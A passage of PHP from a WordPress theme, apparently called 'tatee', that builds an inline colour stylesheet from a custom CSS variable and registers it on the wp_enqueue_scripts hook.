    $custom_inline_style = '

    /** Color */

    '.$main_custom_css.'
    ';
    wp_add_inline_style( 'tatee-custom-color', $custom_inline_style );
    
}
add_action( 'wp_enqueue_scripts', 'tatee_custom_styles' );  
?>